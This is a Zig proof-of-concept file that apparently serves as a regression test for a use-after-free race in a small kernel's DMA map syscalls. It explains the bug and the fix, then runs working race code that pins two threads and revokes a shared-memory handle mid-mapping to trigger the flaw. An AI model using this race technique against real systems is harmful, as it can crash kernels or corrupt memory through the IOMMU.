// PoC for 25ef937: perm_lock-less UAF in sysMemDmaMap / sysMemDmaUnmap.
//
// Pre-patch (kernel/syscall/device.zig before 25ef937):
//
//   pub fn sysMemDmaMap(device_handle: u64, shm_handle: u64) i64 {
//       const proc = sched.currentProc();
//       const dev_entry = proc.getPermByHandle(device_handle) orelse ...;
//       ...
//       const shm_entry = proc.getPermByHandle(shm_handle) orelse ...;
//       const shm = shm_entry.object.shared_memory;       // raw ptr, no refcount
//       const dma_base = arch.mapDmaPages(device, shm) catch ...;
//       ...
//   }
//
// Two perm_lock-less getPermByHandle snapshots, no shm.incRef. The captured
// `*SharedMemory` is then passed into arch.mapDmaPages, which iterates
// `shm.pages` to install IOMMU PTEs. A concurrent revoke_perm(shm_handle)
// from another thread can drop the last reference between the lookup and
// the mapDmaPages call, running shm.destroy() and freeing both the
// SharedMemory struct and the backing pages slab. mapDmaPages then walks
// a freed slice → ring-0 panic in Debug, silent IOMMU-write primitive in
// ReleaseFast.
//
// Post-patch: sysMemDmaMap acquires perm_lock across both lookups, calls
// shm.incRef() under the lock, then unlocks and runs the IOMMU path with
// the SHM pinned. sysMemDmaUnmap mirrors the same shape.
//
// PoC layout: pin main to core 0, spawn a helper pinned to core 1. Each
// iteration main creates a fresh 4 MiB SHM (1024 pages — large enough that
// `for (shm.pages)` inside arch.mapDmaPages takes meaningfully long, which
// widens the window between "shm pointer captured" and "loop completes"),
// publishes its handle, sets `go=1`, and immediately issues mem_dma_map.
// The helper, already spinning on `go`, fires `revoke_perm(shm_h)` from
// the other core within tens of nanoseconds — squarely inside main's
// kernel entry → getPermByHandle → mapDmaPages window. On the unpatched
// kernel the very first won race produces a ring-0 panic from inside
// arch.mapDmaPages (slab UAF: corrupted pages slice, iommu.mapDmaPage on
// garbage paddrs, etc.). On the patched kernel main acquires perm_lock,
// pins shm via incRef, and the IOMMU walk completes safely; revoke either
// beats the lookup (E_BADCAP) or loses the lock and waits — both safe.
//
// Differential:
//   patched   → "POC-25ef937: PATCHED (survived 4096 dma_map/revoke races)"
//   pre-patch → kernel ring-0 panic; PoC never reaches the PATCHED line.
//               Treat absence of the PATCHED line in the serial log as
//               "POC-25ef937: VULNERABLE (kernel did not survive race)".

const lib = @import("lib");
const perm_view = lib.perm_view;
const perms = lib.perms;
const syscall = lib.syscall;

const MAX_ITERS: u64 = 4096;
// 1024 pages = 4 MiB. arch.mapDmaPages walks shm.pages once; the larger
// the slice, the wider the UAF window between capture and loop end.
const SHM_PAGES: u64 = 1024;
const SHM_SIZE: u64 = SHM_PAGES * 4096;

// ── shared state between racer threads ────────────────────────────────
// Volatile to defeat LLVM CSE in optimized builds.
var shm_handle: u64 = 0;
var device_handle: u64 = 0;
var go: u64 = 0;
var helper_done: u64 = 0;
var iter_count: u64 = 0;

fn vload(p: *volatile u64) u64 {
    return p.*;
}

fn vstore(p: *volatile u64, v: u64) void {
    p.* = v;
}

fn helperEntry() void {
    // Pin helper to core 1 so it always races main on a distinct core.
    _ = syscall.set_affinity(0b0010);

    while (true) {
        while (vload(&go) == 0) asm volatile ("pause");

        const h = vload(&shm_handle);
        _ = syscall.revoke_perm(h);

        vstore(&go, 0);
        vstore(&helper_done, 1);

        if (vload(&iter_count) >= MAX_ITERS) return;
    }
}

pub fn main(pv: u64) void {
    // Pin main to core 0 — otherwise thread_create may co-locate the
    // helper on core 0 and the racers serialize.
    _ = syscall.set_affinity(0b0001);

    // Resolve an MMIO device handle with DMA rights (AHCI on q35).
    const view: [*]const perm_view.UserViewEntry = @ptrFromInt(pv);
    var dev_h: u64 = 0;
    for (0..128) |i| {
        const e = &view[i];
        if (e.entry_type != perm_view.ENTRY_TYPE_DEVICE_REGION) continue;
        if (e.deviceType() != 0) continue; // .mmio = 0
        dev_h = e.handle;
        break;
    }
    if (dev_h == 0) {
        syscall.write("POC-25ef937: SKIPPED (no MMIO device region)\n");
        syscall.shutdown();
    }
    device_handle = dev_h;

    const helper_stack_pages: u64 = 4;
    const tret = syscall.thread_create(&helperEntry, 0, helper_stack_pages);
    if (tret < 0) {
        syscall.write("POC-25ef937: SKIPPED (thread_create failed)\n");
        syscall.shutdown();
    }

    const shm_rights = (perms.SharedMemoryRights{ .read = true, .write = true }).bits();

    var i: u64 = 0;
    while (i < MAX_ITERS) {
        vstore(&iter_count, i);

        // Fresh SHM handle for this iteration.
        const h = syscall.shm_create_with_rights(SHM_SIZE, shm_rights);
        if (h < 0) {
            syscall.write("POC-25ef937: SKIPPED (shm_create failed)\n");
            syscall.shutdown();
        }
        vstore(&shm_handle, @bitCast(h));
        vstore(&helper_done, 0);

        // Arm helper and immediately issue the vulnerable syscall.
        vstore(&go, 1);
        const dma = syscall.mem_dma_map(device_handle, @bitCast(h));

        // Wait for helper to finish so revokes don't pile up.
        while (vload(&helper_done) == 0) asm volatile ("pause");

        if (dma >= 0) {
            _ = syscall.mem_dma_unmap(device_handle, @bitCast(h));
        }
        _ = syscall.revoke_perm(@bitCast(h));

        i += 1;
        if ((i & 0x1FF) == 0) syscall.write(".");
    }

    syscall.write("\nPOC-25ef937: PATCHED (survived 4096 dma_map/revoke races)\n");
    syscall.shutdown();
}
